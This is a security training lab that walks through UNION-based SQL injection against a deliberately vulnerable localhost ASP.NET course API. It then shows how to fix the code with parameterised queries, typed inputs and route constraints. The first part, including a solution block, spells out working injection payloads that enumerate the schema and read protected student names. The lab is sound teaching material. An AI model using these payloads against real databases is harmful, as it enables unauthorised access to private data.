/*Introduction
In this lab, you will do some SQL injection to retrieve information that you shouldn't. In a second phase, you will see how to prevent such a thing from happening.

Before you start
This lab starts from starter files called 'SQLInjLab'. You can find these on https://online.u2u.be in a zip file.

There are two folders:

Starter: this is the one you should pick to make the exercise
Finished: this is the solution of the exercise, added for reference
The starter files contain a solution with the following pieces:

Controllers\CoursesController: This is an API controller exposing course information. This is public and accessible by anyone.
Controller\StudentsController: This is an API controller exposing student information. This is not public information. That's why it has been protected using the [Authorize] attribute.
Your job is to get to the students' information anyway.

SQL Injection
In this part, you will try to get access to the students' information.

Inspecting the public api
Ok, first you can inspect what you are supposed to see.

 

1. Start the project.
2. Visit http://localhost:51929/api/courses. You should get the following response:
API RESPONSE*/
[{"courseId":1,"title":"Chemistry","date":"0001-01-01T00:00:00","students":[]},
{"courseId":2,"title":"Calculus","date":"0001-01-01T00:00:00","students":[]},
{"courseId":3,"title":"Literature","date":"0001-01-01T00:00:00","students":[]}]
3. Visit http://localhost:51929/api/courses?id=1. You should get the following response:
API RESPONSE
[{"courseId":1,"title":"Chemistry","date":"0001-01-01T00:00:00","students":[]}]
4. Visit http://localhost:51929/api/courses?id=9000. You should get the following response:
API RESPONSE
[]
5. Visit http://localhost:51929/api/students. You should get an error. You might need to open your browser inspector to see this.
You can derive a couple of things here:

Going through api/students is going to be tough. It might be better to use api/courses to sneak your way in.
Although api/courses doesn't return any students, you can see the information is related.
api/courses?id=1 returns a collection rather than one item. This is probably the result of a lazy developer that didn't want to change the return type when just one item is returned.
Asking for a course with id 9000 didn't result in an error. This is too bad, you could have learned from the error.
Doing SQL Injection
Now, to do SQL injection you need to have a SQL query with a parameter. That means /api/courses?id=something is your only candidate.

When inspecting the result, you can see that it will return something that has a number, a string and a date. Whether the students collection comes from the database is not quite clear. You can figure that out by trying to inject 3 or 4 values in the query. For now, you can assume that the query looks something like this:

SELECT number, string, date FROM SomeTable
You can test this hypothesis by trying to do a UNION with a random number, string and date:

SELECT number, string, date FROM SomeTable
UNION 
SELECT 1, 'hello', '2000-10-01'
This should return a result without any problem. Now you can try to inject this:

6. Inject the previous UNION statement in the id of the course.
URL
<span>http://localhost:51929/api/courses?id=1</span>http://localhost:51929/api/courses?id=1 UNION SELECT 1, 'hello', '2000-01-01'
RESPONSE
[{"courseId":1,"title":"Chemistry","date":"0001-01-01T00:00:00","students":[]},
{"courseId":1,"title":"hello","date":"2000-10-01T00:00:00","students":[]}]
Success! The response contains course number 1, but also the values that you added.

It's even better if you try it with a course that doesn't exist:

URL
http://localhost:51929/api/courses?id=90 UNION SELECT 1, 'hello', '2000-01-01'
RESPONSE
[{"courseId":1,"title":"hello","date":"2000-10-01T00:00:00","students":[]}]
Then you only get the injected information. Ok, now it's your turn.

7. Try getting information about the tables in the database.
Hint: here is a legal way of getting table information
SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
This should be enough to figure out the table where the student information is stored.

8. Next try to get column information about that table. Once again here is the normal way of getting such information:
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'SomeTable'
9. Finally, try to read information like the name of certain students.
 

And Tadaa! No more secrets.

Figure 1

SOLUTION:
UNION SELECT 5, TABLE_NAME, '2000-01-01' FROM INFORMATION_SCHEMA.TABLES;
 
UNION SELECT 5, COLUMN_NAME, '2000-01-01' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Students';
 
UNION SELECT 5, FirstName, '2000-01-01' FROM Students;

Protecting against SQL Injection
Ok great you are now a junior hacker. Now more importantly, how can you protect your content against those wizkids? The trick here is to be secure every step of the way. This way, even if you miss something, you would still be protected.

You can start with where the actual injection happens:

Open Models\CoursesRepository. Locate the GetCourse method. You should see the following piece of code:
COURSESREPOSITORY.CS - GETCOURSE
command.CommandText = $@"SELECT CourseId, Title, Date
                        FROM Courses WHERE CourseId = {id}";
Using string concatenation is a recipe for disaster.

11. Use a SQLParameter instead of string concatenation. These are automatically sanitized.
COURSESREPOSITORY.CS - GETCOURSE
command.CommandText = $@"SELECT CourseId, Title, Date
                        FROM Courses WHERE CourseId = @id";
command.Parameters.Add("id", SqlDbType.Int).Value = id;
Of course, you can just use modern frameworks like Entity Framework, these frameworks check for SQL Injection automatically. Take a look at the StudentsController for an example. However, using Entity Framework does not automatically render SQL Injection impossible, it's just a lot harder.

Another common technique to help things is to do input checking. The GetCourse method receives a string as an input while it should be an integer. This is probably since the value was extracted from the URL as a string, and then simply passed along like that. Being lazy and being secure don't blend very well.

12. Change the input type to int.
COURSESREPOSITORY.CS - GETCOURSE
public List<Course> GetCourse(int id)
The same applies for the output. you expect one item to be returned:

13. Modify the code so it returns one item.
COURSESREPOSITORY.CS - GETCOURSE
public Course GetCourse(int id)
{
  Course course = new Course();
  using (var conn = new SqlConnection(config.ConnectionString))
  {
    conn.Open();
 
    var command = new SqlCommand() { Connection = conn };
    command.CommandText = $@"SELECT CourseId, Title, Date
                            FROM Courses WHERE CourseId = @id";
    command.Parameters.Add("id", SqlDbType.Int).Value = id;
    using (var cmdReader = command.ExecuteReader())
    {
      cmdReader.Read();
 
      course = new Course();
      course.CourseId = cmdReader.GetInt32(cmdReader.GetOrdinal("CourseId"));
      course.Title = cmdReader.GetString(cmdReader.GetOrdinal("Title"));
      course.Date = cmdReader.GetDateTime(cmdReader.GetOrdinal("Date"));
    }
  }
  return course;
}
This last step alone would not have stopped the attack. But it would be more difficult since the user could only read data one by one.

Looks like that method is all set. But let's see what else you can do.

14. Open Controllers\CoursesController. Locate the Get method. You should see the following piece of code:
COURSESCONTROLLER.CS - GET
var id = Request.Query["id"].FirstOrDefault();
Yeah, this is not the best way to retrieve that information: the type of the input is never checked. The developer tried to handle two different scenarios with one method. This caused the lack of input checking and is also the reason why a collection is returned when asking for one item. You can easily solve these problems by separating them into two separate methods:

15. Separate the Get method into two different scenarios:
COURSESCONTROLLER.CS
// GET: api/courses
[HttpGet]
public IEnumerable<Course> Get()
{
  return repo.GetAllCourses();
}
 
// GET api/courses/5
[HttpGet("{id:int}")]
public Course Get(int id)
{
  return repo.GetCourse(id);
}
Notice that you restrict the input in both the input type, but also by using routing constraints.

This concludes the lab.

(Optional) Extra challenge: using EntityFramework Core
This solution still depends on ADO.NET, but the project has an EF Core DbContext available. Try to remove your dependencies on ADO.NET by lever              aging that DbContext.

(Optional) Extra challenge: showing the correct error.
When the end user tries to retrieve a course that doesn't exists. The code throws an exception and the user receives a 500 'Internal Server Error'. This could be improved by returning a 404 'Not Found'. Remember, provide meaningful errors without disclosing internal specifics.

16. Return a 404 when a course if not found.